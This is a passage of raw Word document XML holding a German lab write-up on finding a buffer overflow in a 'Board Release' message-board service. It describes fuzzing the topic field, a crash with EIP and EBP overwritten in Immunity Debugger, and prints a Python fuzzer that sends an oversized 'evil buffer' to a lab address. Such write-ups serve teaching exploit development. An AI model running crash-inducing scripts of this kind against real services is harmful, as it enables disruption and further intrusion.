          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2316C428" wp14:editId="3B6FE4CF">
            <wp:extent cx="1543050" cy="1152525"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="110" name="Grafik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1543050" cy="1152525"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="32164FED" w14:textId="77777777" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D050DA4" w14:textId="77777777" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Diese lassen sich mit ‚D‘ und der ID der Nachricht löschen.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65E91E8C" w14:textId="77777777" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B45D61F" w14:textId="77777777" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Das Board Topic kann mit ‚S‘ aufgelistet werden. Mit ‚C‘ kann das Board Topic verändert werden. Die Änderung wird mit y bestätigt und n abgebrochen.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0134475F" w14:textId="77777777" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DA2AE66" w14:textId="77777777" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4EA9AE78" wp14:editId="5E970031">
            <wp:extent cx="3181350" cy="981075"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="111" name="Grafik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181350" cy="981075"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7509634F" w14:textId="77777777" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0433B45B" w14:textId="61D52E5A" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Zusammengefasst kann also gesagt werden, dass zumindest beim Erstellen der Nachricht und beim Ändern des Board Topic Userinput entgegengenommen wird. Es gilt zu überprüfen, ob ein Userinput an diesen Punkten einen Buffer Overflow auslösen können.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E340850" w14:textId="23E905AE" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Fuzzing:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D8BB8A8" w14:textId="3437D3B5" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CC195F4" w14:textId="23EEAA81" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00E067DB" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Zunächst wurde</w:t>
      </w:r>
      <w:r w:rsidR="00DD5164" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> kein eigner Fuzzer </w:t>
      </w:r>
      <w:r w:rsidR="00C569B9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">geschrieben, sondern manuel getestet. Dazu wurden </w:t>
      </w:r>
      <w:r w:rsidR="008971DA" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">eine Zeichenkette bestehend aus 100 a’s erstellt und dieser beim Ändern des </w:t>
      </w:r>
      <w:r w:rsidR="00400DE3" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Board Topics als Inputwert geliefert.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE387DA" w14:textId="4C7034D8" w:rsidR="00400DE3" w:rsidRPr="00B47CB9" w:rsidRDefault="00400DE3" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5B0781DE" wp14:editId="41BEB69B">
            <wp:extent cx="5759450" cy="344170"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="114" name="Grafik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59450" cy="344170"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="07A828D3" w14:textId="7043B2D0" w:rsidR="00400DE3" w:rsidRPr="00B47CB9" w:rsidRDefault="00400DE3" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="702FD384" w14:textId="538776F9" w:rsidR="00400DE3" w:rsidRPr="00B47CB9" w:rsidRDefault="00400DE3" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Nach dem Bestätigen des Eingabewert</w:t>
      </w:r>
      <w:r w:rsidR="00C21DE6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> mit </w:t>
      </w:r>
      <w:r w:rsidR="00C21DE6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">‚y‘ </w:t>
      </w:r>
      <w:r w:rsidR="00770ABD" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>stürzt die Board Release Anwendung ab:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EEC0D9F" w14:textId="10D3341A" w:rsidR="00770ABD" w:rsidRPr="00B47CB9" w:rsidRDefault="00770ABD" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11828AC9" w14:textId="11D187BF" w:rsidR="00770ABD" w:rsidRPr="00B47CB9" w:rsidRDefault="00770ABD" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2E515CD1" wp14:editId="7FAEF0C1">
            <wp:extent cx="3477846" cy="1535837"/>
            <wp:effectExtent l="0" t="0" r="8890" b="7620"/>
            <wp:docPr id="117" name="Grafik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521455" cy="1555095"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="76AEF635" w14:textId="31283D1A" w:rsidR="00770ABD" w:rsidRPr="00B47CB9" w:rsidRDefault="00770ABD" w:rsidP="00770ABD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6FBCCD02" w14:textId="35ADFEE4" w:rsidR="00770ABD" w:rsidRPr="00B47CB9" w:rsidRDefault="0031023C" w:rsidP="00770ABD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Die Anwendung wurde in den Immunity Debugger eingespielt und gestartet und der Vorgang wiederholt. </w:t>
      </w:r>
      <w:r w:rsidR="00066C8C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Es </w:t>
      </w:r>
      <w:r w:rsidR="00AD3927" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>wurde erkannt, dass das EDX, EBP und EIP Register mit a’s überschrieben worden sind.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F184B30" w14:textId="120972E4" w:rsidR="00494FA2" w:rsidRPr="00B47CB9" w:rsidRDefault="00494FA2" w:rsidP="00770ABD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F895173" w14:textId="33203925" w:rsidR="00494FA2" w:rsidRPr="00B47CB9" w:rsidRDefault="00607BA3" w:rsidP="00770ABD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Anschließend </w:t>
      </w:r>
      <w:r w:rsidR="00E300D6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">wurde eine neue Nachricht erstellt und ebenfalls </w:t>
      </w:r>
      <w:r w:rsidR="007E27D0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>ein</w:t>
      </w:r>
      <w:r w:rsidR="008A7D74" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">e lange Zeichenkette </w:t>
      </w:r>
      <w:r w:rsidR="005F3067" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">erstellt und in den Parametern Name und Message übergeben. Hier konnte vorerst nicht festgestellt werden, dass </w:t>
      </w:r>
      <w:r w:rsidR="001350DD" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>die Anwendung an diesem Punkt anfällig für eine Buffer Overflow Schwachstelle ist.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="763D0526" w14:textId="1DFB724D" w:rsidR="00320E06" w:rsidRPr="00B47CB9" w:rsidRDefault="00320E06" w:rsidP="00770ABD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="525CB23D" w14:textId="0FA55D2C" w:rsidR="00320E06" w:rsidRPr="00B47CB9" w:rsidRDefault="00560920" w:rsidP="00770ABD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Um ermitteln zu können, ab wann das EIP Register überschrieben wird wurde folgendes </w:t>
      </w:r>
      <w:r w:rsidR="00D61410" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Python Skript</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00671DB3" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>entwickelt</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="023AE64C" w14:textId="28A195E0" w:rsidR="00560920" w:rsidRPr="00B47CB9" w:rsidRDefault="00560920" w:rsidP="00770ABD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="00560920" w:rsidRPr="00B47CB9" w14:paraId="787B84B0" w14:textId="77777777" w:rsidTr="00560920">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0C9F127B" w14:textId="77777777" w:rsidR="00560920" w:rsidRPr="000700A3" w:rsidRDefault="00560920" w:rsidP="00560920">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>#!/usr/bin/python</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D94BD9E" w14:textId="77777777" w:rsidR="00560920" w:rsidRPr="000700A3" w:rsidRDefault="00560920" w:rsidP="00560920">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>import socket</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E3B346F" w14:textId="77777777" w:rsidR="00560920" w:rsidRPr="000700A3" w:rsidRDefault="00560920" w:rsidP="00560920">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20575E98" w14:textId="77777777" w:rsidR="00560920" w:rsidRPr="000700A3" w:rsidRDefault="00560920" w:rsidP="00560920">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="52D49FA5" w14:textId="77777777" w:rsidR="00560920" w:rsidRPr="000700A3" w:rsidRDefault="00560920" w:rsidP="00560920">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>a = b'\x41'*25</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41FD6026" w14:textId="77777777" w:rsidR="00560920" w:rsidRPr="000700A3" w:rsidRDefault="00560920" w:rsidP="00560920">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>b = b'\x42'*25</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="305E582A" w14:textId="77777777" w:rsidR="00560920" w:rsidRPr="000700A3" w:rsidRDefault="00560920" w:rsidP="00560920">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>c = b'\x43'*25</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E690C3D" w14:textId="77777777" w:rsidR="00560920" w:rsidRPr="000700A3" w:rsidRDefault="00560920" w:rsidP="00560920">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>d = b'\x44'*25</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F0756DB" w14:textId="77777777" w:rsidR="00560920" w:rsidRPr="000700A3" w:rsidRDefault="00560920" w:rsidP="00560920">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="279BC91B" w14:textId="07161FCE" w:rsidR="00560920" w:rsidRPr="000700A3" w:rsidRDefault="00560920" w:rsidP="00560920">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>buffer = a + b + c + d</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E7ED778" w14:textId="77777777" w:rsidR="00560920" w:rsidRPr="000700A3" w:rsidRDefault="00560920" w:rsidP="00560920">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="031CD517" w14:textId="557924AF" w:rsidR="00560920" w:rsidRPr="000700A3" w:rsidRDefault="00560920" w:rsidP="00560920">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>connect=s.connect(('10.0.2.15', 4444))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04277334" w14:textId="77777777" w:rsidR="00560920" w:rsidRPr="000700A3" w:rsidRDefault="00560920" w:rsidP="00560920">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.recv(1024)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="787B4CEF" w14:textId="77777777" w:rsidR="00560920" w:rsidRPr="000700A3" w:rsidRDefault="00560920" w:rsidP="00560920">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.send(bytes('C \r\n', 'utf-8'))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D4362C1" w14:textId="77777777" w:rsidR="00560920" w:rsidRPr="000700A3" w:rsidRDefault="00560920" w:rsidP="00560920">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.recv(1024)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D304D13" w14:textId="77777777" w:rsidR="00560920" w:rsidRPr="000700A3" w:rsidRDefault="00560920" w:rsidP="00560920">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.send(buffer + bytes('\r\n', 'utf-8'))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="110985E8" w14:textId="77777777" w:rsidR="00560920" w:rsidRPr="000700A3" w:rsidRDefault="00560920" w:rsidP="00560920">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.recv(1024)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3562CB01" w14:textId="77777777" w:rsidR="00560920" w:rsidRPr="000700A3" w:rsidRDefault="00560920" w:rsidP="00560920">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.send(bytes('y\r\n', 'utf-8')) # evil buffer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71E1A4C8" w14:textId="2A12C845" w:rsidR="00560920" w:rsidRPr="00B47CB9" w:rsidRDefault="00560920" w:rsidP="00560920">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>s.close()</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00323CD1" w:rsidRPr="00B47CB9" w14:paraId="3482601B" w14:textId="77777777" w:rsidTr="00560920">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0930E9B4" w14:textId="67BF69E5" w:rsidR="00323CD1" w:rsidRPr="000700A3" w:rsidRDefault="00323CD1" w:rsidP="00560920">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Fuzzer1.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="59FF88EB" w14:textId="30A1EA55" w:rsidR="00560920" w:rsidRPr="00B47CB9" w:rsidRDefault="00560920" w:rsidP="00770ABD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1ADCF21F" w14:textId="0D2A8CCC" w:rsidR="007F292F" w:rsidRPr="00B47CB9" w:rsidRDefault="00B037D0" w:rsidP="00770ABD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Dieses erstellt einen String</w:t>
      </w:r>
      <w:r w:rsidR="008A7E13" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> mit Namen buffer</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> aus den Variablen a, b, c und d</w:t>
      </w:r>
      <w:r w:rsidR="00AF0E0F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="008A7E13" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Nachdem Verbindungsaufbau wird </w:t>
      </w:r>
      <w:r w:rsidR="00D8604B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">mit ‚C‘ das aktuelle Topic verändert. Der String wird </w:t>
      </w:r>
      <w:r w:rsidR="007F292F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>als Topic übergeben und bestätigt.</w:t>
      </w:r>
      <w:r w:rsidR="00D745D5" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Bei der Ausführung des Skripts </w:t>
      </w:r>
      <w:r w:rsidR="00CA20CB" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>konnte ermittelt werden, dass u. a. das EBP und EIP Register mit A’s überschrieben worden sind.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="346830F2" w14:textId="1C2A8EA8" w:rsidR="00CA20CB" w:rsidRPr="00B47CB9" w:rsidRDefault="00CA20CB" w:rsidP="00770ABD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50ED1F02" w14:textId="1BF222F3" w:rsidR="00CA20CB" w:rsidRPr="00B47CB9" w:rsidRDefault="00CA20CB" w:rsidP="00770ABD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="49F21E46" wp14:editId="68803A6B">
            <wp:extent cx="2162175" cy="1057275"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:docPr id="122" name="Grafik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162175" cy="1057275"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7933DD4C" w14:textId="25329399" w:rsidR="00CA20CB" w:rsidRPr="00B47CB9" w:rsidRDefault="00591243" w:rsidP="00770ABD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7B6F28E2" wp14:editId="72804E2D">
            <wp:extent cx="1390650" cy="2343150"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="123" name="Grafik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90650" cy="2343150"/>
                    </a:xfrm>
